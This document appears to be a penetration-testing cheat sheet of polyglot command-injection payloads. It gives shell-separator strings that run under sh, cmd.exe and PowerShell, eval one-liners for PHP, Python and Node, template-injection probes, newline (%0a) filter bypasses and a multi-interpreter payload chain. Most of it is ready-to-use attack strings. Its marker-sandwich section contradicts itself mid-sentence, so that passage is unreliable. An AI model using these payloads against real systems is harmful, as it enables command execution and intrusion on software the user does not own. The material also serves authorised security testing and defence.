# Polyglot Payloads — one input, many interpreters

## Why polyglots — when you don't know the shell yet

A polyglot is a single input that's valid (or exploitable) under more
than one interpreter — saves probes when the shell language is unknown.

## sh|bash|dash + cmd.exe polyglots

The `&` separator works in BOTH POSIX shells and cmd.exe:

```
x & id          — POSIX: background+run; cmd: run-next
x & whoami      — works on both!
x && whoami     — works on both
x | whoami      — works on both
```

`&`, `&&`, `||`, `|` are shared. `;` is POSIX-only. `` ` `` is POSIX-only.
`$( )` is POSIX+PowerShell. `%VAR%` is cmd-only.

Universal command that exists on both: `whoami`, `hostname`, `echo` —
but `id`/`cat`/`ls` are POSIX-only; `type`/`dir`/`ipconfig` are cmd-only.

A real both-OS polyglot:

```
x & echo POSIX_$(id)_WIN_& whoami
```

The `&` splits everywhere; POSIX does `echo POSIX_<id>_WIN_` then
`whoami`; cmd does `echo POSIX_$(id)_WIN_` (literal) then `whoami`.
Both outputs carry a marker.

## POSIX + PowerShell polyglot

`$( )` is PS subexpression AND POSIX substitution:

```
x;$(id)          — POSIX: runs id; PS: id isn't a cmdlet — fails
x;$(whoami)      — whoami exists both places
x;$(hostname)    — same
```

`Get-Content`/`gc`/`type`/`ls`/`dir`/`cat`/`echo`/`pwd` — aliases that
exist in BOTH cmd AND PowerShell AND (some) POSIX:

```
x;id              — POSIX works; PS: 'id' isn't recognized
x;ls              — POSIX lists; PS aliases Get-ChildItem — both run!
x;ls /            — POSIX: dir /; PS: error on '/'
x;pwd             — POSIX pwd; PS pwd alias — both run
x;cat f           — POSIX cat; PS Get-Content — both run
x;whoami          — POSIX + Windows builtin + PS alias — universal
x;hostname        — universal
```

`whoami`/`hostname`/`ls`/`pwd`/`cat`/`dir`/`echo` are the cross-shell
universal names.

## PHP|Python|Node eval polyglot — code-level

If the sink is an evaluator (eval-injection), one-liners that work in
multiple languages:

```
system('id')       — PHP function — python needs os.system
__import__('os').system('id')   — python-only
require('child_process').execSync('id')  — node-only
```

Real polyglot eval payloads are hard — the syntax differs too much.
The better approach: the `7*7→49` probe fingerprints the evaluator
first, then pick the language-specific payload.

## `#{ }`/`${ }`/`{{ }}` — template-interpolation polyglot

```
${7*7}   — bash expr, JSP-EL, SpEL, JS-template-literal, PS-string
#{7*7}   — Ruby interp, SpEL, Groovy
{{7*7}}  — Jinja/Twig/Handlebars/Mustache
```

Send all three markers — whichever evaluates fingerprints the engine —
`eval-injection.md`'s fingerprint table.

## Comment-polyglot — ending the line in every language

```
#   — POSIX/python/ruby/perl comment
//  — js/php/c comment
--  — sql/lua/haskell
REM — batch
```

`payload#//` or `payload#` + separate probes for `//`. There's no true
universal comment — `;id;#` POSIX-side, `&id&REM` cmd-side.

## Newline as the separator-polyglot — `%0a`

`\n` separates POSIX commands AND acts as a statement terminator in
evaluators (PHP `eval("x\ny")`, python exec multi-line). `%0a` survives
most single-line filters — the one separator that crosses boundaries.

## The "send two payloads in one request" trick

```
x;id$(echo -e '\n')&whoami&powershell -c id
```

Multiple separators run multiple commands — each interpreter parses
its own subset — the survivor output fingerprints the shell.

## Detection-first polyglot — the marker sandwich

```
echo P$(id 2>/dev/null)S;echo P$(hostname)S;echo P%COMPUTERNAME%S
```

Whatever substitutes reveals the interp: `Puid=33S`→POSIX, `PmyhostS`
→hostname ran, `P%COMPUTERNAME%S`→PS/cmd didn't expand so cmd shows
literal `%...%` — wait, cmd DOES expand `%X%` — cmd shows the computer
name.

## Falsifiers

- no interpreter accepts any candidate form → class falsifier route

## Output to record

- which form produced output + which interpreter it fingerprinted
